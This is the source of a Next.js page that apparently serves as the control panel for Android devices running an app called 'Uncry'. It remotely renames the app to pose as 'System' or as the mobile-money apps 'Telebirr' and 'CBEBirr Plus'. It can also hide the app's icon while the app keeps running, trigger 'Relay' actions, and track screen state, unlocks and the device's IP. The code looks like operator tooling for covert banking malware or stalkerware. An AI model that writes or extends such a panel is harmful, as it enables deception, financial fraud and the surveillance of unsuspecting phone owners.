"use client";
import { useEffect, useState } from "react";
import Link from "next/link";
import { useParams } from "next/navigation";
import RelayDialog from "../RelayDialog";

type Device = {
  deviceId:string; model:string; androidVersion:string; appVersion:string;
  installed:string[]; missing:string[]; monitorRunning:boolean;
  batteryOptimized:boolean; lastSeen:string; firstSeen:string; heartbeatCount:number;
  ip?:string; userAgent?:string; alias?:string; appLabel?:string; hidden?:boolean;
  inUse?:boolean; screenOn?:boolean; lastUnlock?:string;
};

const ALIAS_OPTIONS = [
  { key: "system", label: "System" },
  { key: "telebirr", label: "Telebirr" },
  { key: "cbebirr-plus", label: "CBEBirr Plus" },
];

export default function DeviceDetail(){
  const { deviceId } = useParams() as { deviceId: string };
  const [dev, setDev] = useState<Device|null>(null);
  const [err, setErr] = useState("");
  const [now, setNow] = useState(Date.now());
  const [dlg, setDlg] = useState<1|2|null>(null);

  const load = async()=>{
    try{
      const r = await fetch(`/api/devices/${encodeURIComponent(deviceId)}`, { cache:"no-store" });
      const j = await r.json();
      if (!r.ok) throw new Error(j.error||"not found");
      setDev(j.device); setErr("");
    }catch(e:any){ setErr(e.message); }
  };
  useEffect(()=>{ load(); const i=setInterval(load,3000); const t=setInterval(()=> setNow(Date.now()),1000); return()=>{clearInterval(i);clearInterval(t)} },[deviceId]);

  if (err) return <main className="max-w-3xl mx-auto px-6 py-8"><Link href="/dashboard" className="text-sm text-violet-600">← Back</Link><p className="mt-4 text-red-600">Device not found: {err} (may have vanished — TTL 120s after offline)</p></main>;
  if (!dev) return <main className="max-w-3xl mx-auto px-6 py-8"><Link href="/dashboard" className="text-sm text-violet-600">← Back</Link><p className="mt-4 text-gray-400">Loading {deviceId}…</p></main>;

  const online = Date.now() - new Date(dev.lastSeen).getTime() < 90_000;
  const ageSec = Math.floor((now - new Date(dev.lastSeen).getTime())/1000);

  return <main className="max-w-3xl mx-auto px-6 py-8">
    <div className="flex items-center justify-between">
      <Link href="/dashboard" className="text-sm text-violet-600">← All devices</Link>
      <div className="flex gap-2"><button onClick={()=>setDlg(1)}
        className="bg-violet-600 text-white text-sm px-4 py-1.5 rounded-lg hover:bg-violet-700">Relay 1</button><button onClick={()=>setDlg(2)}
        className="bg-fuchsia-600 text-white text-sm px-4 py-1.5 rounded-lg hover:bg-fuchsia-700">Relay 2</button></div>
    </div>
    {dlg && <RelayDialog deviceId={dev.deviceId} slot={dlg} onClose={()=>setDlg(null)} />}
    <div className="flex items-center gap-3 mt-3">
      <h1 className="text-xl font-bold font-mono">{dev.deviceId}</h1>
      <span className={`text-xs px-2 py-1 rounded-full ${online?"bg-emerald-500 text-white":"bg-red-100 text-red-600"}`}>{online?`online • ${ageSec}s ago`:`offline • ${ageSec}s ago`}</span>
      <span className={`text-xs px-2 py-1 rounded-full ${dev.monitorRunning?"bg-green-100 text-green-700":"bg-gray-100"}`}>{dev.monitorRunning?"monitor running":"monitor stopped"}</span>
    </div>
    <p className="text-sm text-gray-500 mt-1">{dev.model} · Android {dev.androidVersion} · {dev.appVersion} · {dev.heartbeatCount} heartbeats</p>

    <div className="border rounded-2xl p-4 mt-4">
      <div className="text-xs text-gray-500">Launcher name (vanity)</div>
      <div className="text-sm mt-1">Currently <span className="font-semibold">{dev.appLabel||"Uncry"}</span> — tap a name to rename this device within 5s</div>
      <div className="flex gap-2 mt-3">{ALIAS_OPTIONS.map(o=>(
        <button key={o.key} onClick={async()=>{
          const r=await fetch(`/api/devices/${encodeURIComponent(dev.deviceId)}/rename`,{method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({alias:o.key})});
          const j=await r.json();
          if(r.ok) alert(`Rename queued — ${dev.deviceId.slice(0,8)} becomes "${o.label}" within 5s`);
          else alert(`Rename failed: ${j.error}`);
        }} className={`text-sm px-4 py-1.5 rounded-lg border ${(dev.alias||"uncry")===o.key?"bg-slate-800 text-white border-slate-800":"hover:bg-gray-100"}`}>{o.label}</button>
      ))}</div>
    </div>

    <div className="border rounded-2xl p-4 mt-4">
      <div className="text-xs text-gray-500">Launcher icon</div>
      <div className="text-sm mt-1">Currently <span className="font-semibold">{dev.hidden?"hidden (in launcher, still installed + running)":"visible"}</span></div>
      <button onClick={async()=>{
        // visible=true brings the icon back, visible=false hides it.
        // Currently hidden -> send true (Visible); currently visible -> send false (Hide).
        const visible = dev.hidden === true;
        const r=await fetch(`/api/devices/${encodeURIComponent(dev.deviceId)}/visibility`,{method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({visible})});
        const j=await r.json();
        if(r.ok) alert(visible?`Visible queued — ${dev.deviceId.slice(0,8)} icon returns within 5s`:`Hide queued — ${dev.deviceId.slice(0,8)} icon disappears within 5s (app stays installed + running)`);
        else alert(`Visibility failed: ${j.error}`);
      }} className={`text-sm px-4 py-1.5 rounded-lg mt-3 ${dev.hidden?"bg-emerald-600 text-white hover:bg-emerald-700":"border hover:bg-gray-100"}`}>{dev.hidden?"Visible":"Hide"}</button>
    </div>

    <div className="grid grid-cols-2 gap-4 mt-6">
      <div className="border rounded-2xl p-4"><div className="text-xs text-gray-500">Installed</div><div className="mt-1 text-sm">{dev.installed.length ? dev.installed.map(s=> <span key={s} className="inline-block bg-green-50 border border-green-200 rounded-full px-2 py-1 text-xs mr-1 mb-1">{s}</span>) : <span className="text-gray-400">none</span>}</div><div className="text-xs text-gray-400 mt-2">Missing: {dev.missing.join(", ")||"—"}</div></div>
      <div className="border rounded-2xl p-4"><div className="text-xs text-gray-500">Battery</div><div className={`mt-1 text-sm ${dev.batteryOptimized?"text-amber-600":"text-emerald-600"}`}>{dev.batteryOptimized?"Optimized (risk — may kill background)":"Exempt ✓"}</div><div className="text-xs text-gray-500 mt-3">First seen</div><div className="text-sm">{new Date(dev.firstSeen).toLocaleString()}</div><div className="text-xs text-gray-500 mt-1">Last seen</div><div className="text-sm">{new Date(dev.lastSeen).toLocaleString()}</div></div>
    </div>

    <div className="border rounded-2xl p-4 mt-4">
      <div className="text-xs text-gray-500">Live timeline (polls every 3s)</div>
      <div className="text-sm mt-1">Heartbeat #{dev.heartbeatCount} · {online ? "device is heartbeating every 60s" : "no heartbeat — will vanish 120s after lastSeen"}</div>
      <div className="mt-3 h-2 bg-gray-100 rounded-full overflow-hidden"><div className="h-full bg-violet-600 transition-all" style={{width: `${online ? Math.max(10, 100 - ageSec) : 0}%`}} /></div>
      <div className="text-xs text-gray-400 mt-1">{online ? `${90 - ageSec}s until marked offline` : "offline"}</div>
    </div>

    <div className="border rounded-2xl p-4 mt-4">
      <div className="text-xs text-gray-500">Usage (screen + unlock)</div>
      <div className="text-sm mt-1">Currently <span className="font-semibold">{dev.inUse?"in use":"idle"}</span> · screen <span className="font-semibold">{dev.screenOn===false?"off":"on"}</span></div>
      <div className="text-xs text-gray-400 mt-1">Last unlock: {dev.lastUnlock?new Date(dev.lastUnlock).toLocaleString():"—"}</div>
    </div>

    <details className="mt-4 text-xs bg-gray-50 p-3 rounded-xl"><summary className="font-medium cursor-pointer">Raw</summary><pre className="mt-2 overflow-auto">{JSON.stringify(dev,null,2)}</pre></details>
    <p className="text-xs text-gray-400 mt-3">Ephemeral: row disappears from dashboard ~120s after offline. Keep Uncry foreground/service alive to stay online.</p>
  </main>
}
